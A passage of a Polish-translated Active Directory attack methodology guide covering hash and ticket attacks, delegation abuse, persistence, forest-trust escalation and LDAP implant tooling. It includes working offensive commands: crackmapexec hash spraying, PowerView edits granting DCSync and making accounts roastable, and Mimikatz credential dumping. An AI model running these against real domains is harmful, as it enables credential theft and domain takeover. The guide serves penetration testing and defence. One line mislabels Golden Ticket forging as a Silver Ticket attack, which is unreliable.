**Gdy masz hash użytkownika**, możesz użyć go do **podszycia się pod niego**.\
Musisz użyć **narzędzia**, które **przeprowadzi** **uwierzytelnianie NTLM z użyciem** tego **has####a**, **albo możesz utworzyć nową sesję logowania** i **wstrzyknąć** ten **hash** do **LSASS**, aby podczas wykonywania dowolnego **uwierzytelniania NTLM** został użyty **ten hash**. Ostatnią opcję oferuje mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak ma na celu **użycie hasha NTLM użytkownika do żądania biletów Kerberos**, jako alternatywy dla powszechnie stosowanego Pass The Hash przez protokół NTLM. Może to być szczególnie **przydatne w sieciach, w których protokół NTLM jest wyłączony** i jako protokół uwierzytelniania dozwolony jest wyłącznie **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną bilet uwierzytelniający użytkownika** zamiast jego hasła lub wartości hash. Następnie skradziony bilet służy do **podszycia się pod użytkownika** i uzyskania nieautoryzowanego dostępu do zasobów oraz usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Jeśli masz **hash** lub **hasło** **lokalnego administratora**, powinieneś spróbować **zalogować się lokalnie** na innych **komputerach** przy jego użyciu.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Pamiętaj, że jest to dość **noisy**, a **LAPS** może temu **mitigate**.

### Abuse MSSQL i Trusted Links

Jeśli użytkownik ma uprawnienia do **access MSSQL instances**, może użyć ich do **execute commands** na hoście MSSQL (jeśli działa jako SA), **steal** NetNTLM **hash** lub nawet przeprowadzić **relay** **attack**.\
Ponadto, jeśli instancja MSSQL jest zaufana (database link) przez inną instancję MSSQL, a użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **use the trust relationship to execute queries also in the other instance**. Te trust relationships można łańcuchować i w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, na której będzie mógł wykonać commands.\
**Links między bazami danych działają nawet poprzez forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse platform IT asset/deployment

Zewnętrzne pakiety inventory i deployment często udostępniają potężne ścieżki do credentials i code execution. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz domain privileges na komputerze, będziesz w stanie dump TGTs z pamięci każdego użytkownika, który loguje się na tym komputerze.\
Jeśli więc **Domain Admin logins onto the computer**, będziesz w stanie dump jego TGT i impersonate go za pomocą [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatically compromise a Print Server** (miejmy nadzieję, że będzie to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma włączoną opcję "Constrained Delegation", będzie mógł **impersonate any user to access some services in a computer**.\
Następnie, jeśli **compromise the hash** tego użytkownika/komputera, będziesz mógł **impersonate any user** (nawet domain admins), aby uzyskać dostęp do niektórych services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia uzyskanie code execution z **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse Permissions/ACLs

Przejęty użytkownik może mieć **interesting privileges over some domain objects**, które mogą pozwolić na późniejsze **lateral move**/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuse usługi Printer Spooler

Wykrycie **Spool service listening** w domenie może zostać **abused** do **acquire new credentials** i **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuse sesji third party

Jeśli **other users** **access** **compromised** machine, możliwe jest **gather credentials from memory**, a nawet **inject beacons in their processes**, aby ich impersonate.\
Zwykle użytkownicy uzyskują dostęp do systemu przez RDP, dlatego poniżej opisano, jak przeprowadzić kilka attacks na third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system do zarządzania **local Administrator password** na komputerach dołączonych do domeny, gwarantując, że hasło jest **randomized**, unikalne i często **changed**. Hasła te są przechowywane w Active Directory, a dostęp do nich jest kontrolowany za pomocą ACLs i ograniczony wyłącznie do autoryzowanych użytkowników. Przy wystarczających uprawnieniach do odczytu tych haseł możliwy staje się pivoting do innych komputerów.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** z przejętej maszyny może być sposobem na escalate privileges w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuse Certificate Templates

Jeśli skonfigurowano **vulnerable templates**, można je **abuse**, aby escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation z kontem o wysokich uprawnieniach

### Dumping Domain Credentials

Po uzyskaniu uprawnień **Domain Admin** lub, jeszcze lepiej, **Enterprise Admin**, możesz **dump** **domain database**: _ntds.dit_.

[**Więcej informacji o DCSync attack znajdziesz tutaj**](dcsync.md).

[**Więcej informacji o tym, jak ukraść NTDS.dit, znajdziesz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Niektóre z wcześniej omówionych technik mogą zostać użyte do persistence.\
Na przykład możesz:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Przyznać użytkownikowi uprawnienia [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** tworzy **legitimate Ticket Granting Service (TGS) ticket** dla konkretnej usługi, używając **NTLM hash** (na przykład **hash of the PC account**). Metoda ta służy do uzyskania **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** polega na uzyskaniu przez attackera dostępu do **NTLM hash of the krbtgt account** w środowisku Active Directory (AD). To konto jest wyjątkowe, ponieważ służy do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Po uzyskaniu tego hasha attacker może tworzyć **TGTs** dla dowolnie wybranego konta (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są podobne do golden tickets, ale są fałszowane w sposób, który **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** to bardzo dobry sposób na persistence na koncie użytkownika (nawet jeśli zmieni on hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **privileged groups** (takich jak Domain Admins i Enterprise Admins), stosując standardową **Access Control List (ACL)** do tych grup w celu zapobiegania nieautoryzowanym zmianom. Funkcja ta może jednak zostać wykorzystana: jeśli attacker zmodyfikuje ACL obiektu AdminSDHolder, aby nadać pełny dostęp zwykłemu użytkownikowi, użytkownik ten uzyska szeroką kontrolę nad wszystkimi privileged groups. Mechanizm bezpieczeństwa, który miał chronić, może więc zadziałać odwrotnie i umożliwić nieuprawniony dostęp, jeśli nie jest dokładnie monitorowany.

[**Więcej informacji o AdminDSHolder Group znajdziesz tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Na każdym **Domain Controller (DC)** istnieje konto **local administrator**. Po uzyskaniu praw administratora na takiej maszynie hash lokalnego Administratora można wyodrębnić za pomocą **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **enable the use of this password**, co pozwoli na zdalny dostęp do lokalnego konta Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Możesz **give** użytkownikowi **special permissions** do określonych obiektów domeny, co pozwoli mu w przyszłości **escalate privileges**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** służą do **store** **permissions**, które **an object has** do **an object**. Jeśli możesz wprowadzić nawet **little change** w **security descriptor** obiektu, możesz uzyskać bardzo interesujące uprawnienia do tego obiektu bez konieczności bycia członkiem privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Wykorzystaj auxiliary class `dynamicObject` do tworzenia krótkotrwałych principals/GPOs/rekordów DNS z `entryTTL`/`msDS-Entry-Time-To-Die`; usuną się automatycznie bez tombstones, usuwając ślady w LDAP, a jednocześnie pozostawiając osierocone SIDs, uszkodzone referencje `gPLink` lub zapisane w cache odpowiedzi DNS (np. zanieczyszczenie ACE obiektu AdminSDHolder albo złośliwe przekierowania `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **universal password**, zapewniając dostęp do wszystkich kont domenowych.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Dowiedz się tutaj, czym jest SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz utworzyć **own SSP**, aby **capture** w **clear text** **credentials** używane do uzyskania dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **new Domain Controller** w AD i używa go do **push attributes** (SIDHistory, SPNs...) do określonych obiektów, nie pozostawiając żadnych **logs** dotyczących **modifications**. Potrzebujesz uprawnień **DA** i musisz znajdować się w **root domain**.\
Pamiętaj, że użycie nieprawidłowych danych spowoduje pojawienie się bardzo niepożądanych logów.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omówiliśmy, jak escalate privileges, jeśli masz **enough permission to read LAPS passwords**. Hasła te mogą jednak również służyć do **maintain persistence**.\
Zobacz:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft uważa **Forest** za granicę bezpieczeństwa. Oznacza to, że **compromising a single domain could potentially lead to the entire Forest being compromised**.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa, który umożliwia użytkownikowi z jednej **domain** dostęp do zasobów w innej **domain**. Tworzy on połączenie między systemami uwierzytelniania obu domen, umożliwiając płynny przepływ weryfikacji uwierzytelniania. Po ustanowieniu trust domains wymieniają i przechowują określone **keys** na swoich **Domain Controllers (DCs)**, które mają kluczowe znaczenie dla integralności trust.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **trusted domain**, musi najpierw zażądać specjalnego biletu, znanego jako **inter-realm TGT**, od DC własnej domeny. TGT jest szyfrowany za pomocą współdzielonego **key**, uzgodnionego przez obie domeny. Następnie użytkownik przekazuje ten TGT do **DC of the trusted domain**, aby uzyskać service ticket (**TGS**). Po pomyślnej walidacji inter-realm TGT przez DC trusted domain wystawia on TGS, przyznając użytkownikowi dostęp do usługi.

**Steps**:

1. **Client computer** w **Domain 1** rozpoczyna proces, używając swojego **NTLM hash**, aby zażądać **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wystawia nowy TGT, jeśli uwierzytelnienie klienta zakończy się powodzeniem.
3. Następnie klient żąda **inter-realm TGT** od DC1, który jest potrzebny do uzyskania dostępu do zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany za pomocą **trust key** współdzielonego przez DC1 i DC2 w ramach two-way domain trust.
5. Klient przekazuje inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 weryfikuje inter-realm TGT za pomocą współdzielonego trust key i, jeśli jest prawidłowy, wystawia **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. Na końcu klient przekazuje ten TGS serwerowi. Jest on szyfrowany za pomocą hash konta serwera i służy do uzyskania dostępu do usługi w Domain 2.

### Different trusts

Należy pamiętać, że **trust może być one-way lub two-way**. W przypadku two-way obie domeny ufają sobie nawzajem, natomiast w relacji **one-way** jedna z domen jest **trusted**, a druga **trusting**. W tym drugim przypadku **będziesz mieć możliwość uzyskania dostępu do zasobów w trusting domain wyłącznie z trusted domain**.

Jeśli Domain A ufa Domain B, A jest trusting domain, a B jest trusted domain. Ponadto w **Domain A** będzie to **Outbound trust**, a w **Domain B** będzie to **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Jest to typowa konfiguracja w ramach tego samego forest, w której child domain automatycznie ma two-way transitive trust z parent domain. Oznacza to, że żądania uwierzytelniania mogą płynnie przepływać między parent i child.
- **Cross-link Trusts**: Nazywane również "shortcut trusts", są ustanawiane między child domains w celu przyspieszenia procesów referral. W złożonych forestach referral uwierzytelniania muszą zazwyczaj przejść do forest root, a następnie wrócić do docelowej domain. Utworzenie cross-links skraca tę drogę, co jest szczególnie korzystne w środowiskach rozproszonych geograficznie.
- **External Trusts**: Są ustanawiane między różnymi, niezależnymi domains i z natury są non-transitive. Zgodnie z [dokumentacją Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) external trusts są przydatne do uzyskiwania dostępu do zasobów w domain poza bieżącym forest, która nie jest połączona za pomocą forest trust. Bezpieczeństwo zwiększa SID filtering stosowane w external trusts.
- **Tree-root Trusts**: Te trusts są automatycznie ustanawiane między forest root domain a nowo dodanym tree root. Choć nie są często spotykane, tree-root trusts są ważne przy dodawaniu nowych drzew domains do forest, umożliwiając im zachowanie unikalnej nazwy domain i zapewniając two-way transitivity. Więcej informacji można znaleźć w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trust to two-way transitive trust między dwiema forest root domains, który dodatkowo wymusza SID filtering w celu zwiększenia bezpieczeństwa.
- **MIT Trusts**: Te trusts są ustanawiane z nie-Windowsowymi domains Kerberos zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts są nieco bardziej wyspecjalizowane i przeznaczone dla środowisk wymagających integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Other differences in **trusting relationships**

- Trust relationship może być również **transitive** (A ufa B, B ufa C, więc A ufa C) lub **non-transitive**.
- Trust relationship może być skonfigurowana jako **bidirectional trust** (obie strony ufają sobie nawzajem) lub **one-way trust** (tylko jedna strona ufa drugiej).

### Attack Path

1. **Enumerate** trusting relationships
2. Sprawdź, czy dowolny **security principal** (user/group/computer) ma **access** do zasobów **other domain**, na przykład poprzez wpisy ACE lub członkostwo w groups drugiej domeny. Szukaj **relationships across domains** (prawdopodobnie właśnie w tym celu utworzono trust).
1. kerberoast w tym przypadku może być kolejną opcją.
3. **Compromise** **accounts**, które mogą wykonywać **pivot** między domains.

Attackers z dostępem do zasobów w innej domenie mogą korzystać z trzech podstawowych mechanizmów:

- **Local Group Membership**: Principals mogą zostać dodani do lokalnych groups na maszynach, takich jak grupa "Administrators" na serwerze, co zapewnia im znaczną kontrolę nad tą maszyną.
- **Foreign Domain Group Membership**: Principals mogą również być członkami groups w foreign domain. Skuteczność tej metody zależy jednak od charakteru trust i zakresu group.
- **Access Control Lists (ACLs)**: Principals mogą zostać wskazani w **ACL**, w szczególności jako entities w **ACEs** w ramach **DACL**, zapewniając im dostęp do określonych zasobów. Osoby chcące dokładniej poznać mechanizmy ACLs, DACLs i ACEs znajdą w whitepaperze "[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)" nieocenione źródło informacji.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć foreign security principals w domenie. Będą to user/group z **external domain/forest**.

Możesz sprawdzić to w **Bloodhound** lub za pomocą powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby wyliczania relacji zaufania domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 zaufane klucze**: jeden dla _Child --> Parent_, a drugi dla _Parent_ --> _Child_.\
> Możesz znaleźć ten używany przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaluj do poziomu Enterprise admin w domenie child/parent, wykorzystując trust za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie sposobu wykorzystania Configuration Naming Context (NC) ma kluczowe znaczenie. Configuration NC służy jako centralne repozytorium danych konfiguracyjnych w całym lesie w środowiskach Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, przy czym zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, należy mieć **uprawnienia SYSTEM na DC**, najlepiej child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o site'ach wszystkich komputerów dołączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, attackerzy mogą linkować GPO do site'ów root DC. Działanie to może doprowadzić do przejęcia root domain poprzez modyfikowanie polityk stosowanych do tych site'ów.

Szczegółowe informacje można znaleźć w opracowaniu na temat [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Jeden z wektorów ataku polega na zaatakowaniu uprzywilejowanych gMSA w domenie. Klucz KDS Root, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, można uzyskać dostęp do klucza KDS Root i obliczyć hasła dowolnego gMSA w całym lesie.

Szczegółową analizę i instrukcje krok po kroku można znaleźć tutaj:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak na delegowane MSA (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe badania zewnętrzne: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Ta metoda wymaga cierpliwości i oczekiwania na utworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, attacker może zmodyfikować AD Schema, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to prowadzić do nieautoryzowanego dostępu do nowo tworzonych obiektów AD i przejęcia nad nimi kontroli.

Więcej informacji można znaleźć w [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Podatność ADCS ESC5 dotyczy kontroli nad obiektami Public Key Infrastructure (PKI), umożliwiającej utworzenie certificate template, który pozwala na uwierzytelnianie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, przejęcie zapisywalnego child DC umożliwia wykonanie ataków ESC5.

Więcej szczegółów można znaleźć w [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> W scenariuszach, w których nie ma ADCS, attacker może skonfigurować wymagane komponenty, jak omówiono w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **zewnętrzna domena ufa Twojej domenie**, zapewniając Ci **nieokreślone uprawnienia** w jej obrębie. Musisz znaleźć, **które podmioty zabezpieczeń z Twojej domeny mają jaki dostęp do zewnętrznej domeny**, a następnie spróbować to wykorzystać:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu — jednokierunkowa (wychodząca)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **twoja domena** **ufa** pewnym **uprawnieniom** principalowi z **innej domeny**.

Jednak gdy **domena jest zaufana** przez domenę ufającą, zaufana domena **tworzy użytkownika** z **przewidywalną nazwą**, który używa jako **hasła zaufanego hasła**. Oznacza to, że możliwe jest **uzyskanie dostępu do użytkownika z domeny ufającej, aby dostać się do zaufanej domeny**, przeprowadzić jej enumerację i spróbować dalej eskalować uprawnienia:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na skompromitowanie zaufanej domeny jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** do relacji zaufania domen (co nie jest zbyt częste).

Kolejnym sposobem na skompromitowanie zaufanej domeny jest oczekiwanie na maszynie, do której **użytkownik z zaufanej domeny może uzyskać dostęp**, aby zalogował się przez **RDP**. Następnie atakujący może wstrzyknąć kod do procesu sesji RDP i **uzyskać dostęp do domeny źródłowej ofiary**.\
Ponadto, jeśli **ofiara zamontowała swój dysk twardy**, atakujący może z poziomu procesu **sesji RDP** zapisać **backdoory** w **folderze startowym dysku twardego**. Ta technika nosi nazwę **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigacja nadużywania zaufania domen

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history między forest trusts jest ograniczane przez SID Filtering, który jest domyślnie aktywowany dla wszystkich inter-forest trusts. Opiera się to na założeniu, że intra-forest trusts są bezpieczne, ponieważ zgodnie ze stanowiskiem Microsoftu granicą bezpieczeństwa jest forest, a nie domena.
- Istnieje jednak pewien problem: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego okazjonalnego wyłączania.

### **Selective Authentication:**

- W przypadku inter-forest trusts użycie Selective Authentication gwarantuje, że użytkownicy z obu forests nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskiwać dostęp do domen i serwerów w trusting domain lub forest.
- Należy pamiętać, że środki te nie chronią przed wykorzystaniem writable Configuration Naming Context (NC) ani przed atakami na konto trust.

[**Więcej informacji o domain trusts w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

Kolekcja [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementuje na nowo prymitywy LDAP w stylu bloodyAD jako x64 Beacon Object Files, które działają w całości wewnątrz on-host implant (np. Adaptix C2). Operatorzy kompilują pakiet za pomocą `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z poziomu beacona. Cały ruch wykorzystuje bieżący kontekst bezpieczeństwa logowania przez LDAP (389) z signing/sealing lub LDAPS (636) z automatycznym zaufaniem certyfikatom, więc nie są wymagane socks proxies ani artefakty na dysku.<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające im obiekty.
- `get-object`, `get-attribute` i `get-domaininfo` pobierają dowolne atrybuty (w tym security descriptors), a także metadane forest/domain z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` ujawniają kandydatów do roasting, ustawienia delegacji oraz istniejące deskryptory [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) bezpośrednio z LDAP.
- `get-acl` i `get-writable --detailed` analizują DACL, aby wyświetlić trustees, prawa (GenericAll/WriteDACL/WriteOwner/attribute writes) oraz dziedziczenie, zapewniając natychmiastowe cele do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Prymitywy zapisu LDAP na potrzeby eskalacji i persistence

- BOF-y tworzące obiekty (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowe principals lub konta komputerów wszędzie tam, gdzie istnieją uprawnienia do OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` umożliwiają bezpośrednie przejęcie celów po znalezieniu uprawnień do zapisu właściwości.
- Polecenia skupione na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, przekształcają WriteDACL/WriteOwner dowolnego obiektu AD w możliwość resetowania haseł, kontrolowania członkostwa w grupach lub uzyskania uprawnień do replikacji DCSync, bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają dodane ACE.

### Delegation, roasting i nadużycia Kerberos

- `add-spn`/`set-spn` natychmiast sprawiają, że przejęty użytkownik staje się podatny na Kerberoasting; `add-asreproastable` (przełącznik UAC) oznacza go jako podatnego na AS-REP roasting bez modyfikowania hasła.
- Makra delegacji (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modyfikują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` bezpośrednio z beaconu, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę używania zdalnego PowerShell lub RSAT.

### Wstrzykiwanie sidHistory, relokacja OU i kształtowanie attack surface

- `add-sidhistory` wstrzykuje uprzywilejowane SID-y do historii SID kontrolowanego principal (zobacz [SID-History Injection](sid-history-injection.md)), zapewniając skryte dziedziczenie dostępu w całości za pośrednictwem LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU, w których już istnieją delegowane uprawnienia, a następnie nadużyć `set-password`, `add-groupmember` lub `add-spn`.
- Ściśle ukierunkowane polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) umożliwiają szybki rollback po pozyskaniu credentials lub persistence przez operatora, minimalizując telemetry.

## AD -> Azure i Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Ogólne mechanizmy obronne

[**Dowiedz się tutaj więcej o ochronie credentials.**](../stealing-credentials/credentials-protections.md)

### **Środki ochrony credentials**

- **Ograniczenia dla Domain Admins**: Zaleca się, aby Domain Admins mogli logować się wyłącznie do Domain Controllers, a ich używanie na innych hostach było zabronione.
- **Uprawnienia kont usług**: Usługi nie powinny być uruchamiane z uprawnieniami Domain Admin (DA), aby zachować bezpieczeństwo.
- **Ograniczenie uprawnień w czasie**: W przypadku zadań wymagających uprawnień DA ich czas trwania powinien być ograniczony. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ograniczanie LDAP relay**: Należy przeprowadzić audyt Event ID 2889/3074/3075, a następnie wymusić LDAP signing oraz LDAPS channel binding na DC/klientach, aby blokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting aktywności Impacket na poziomie protokołu

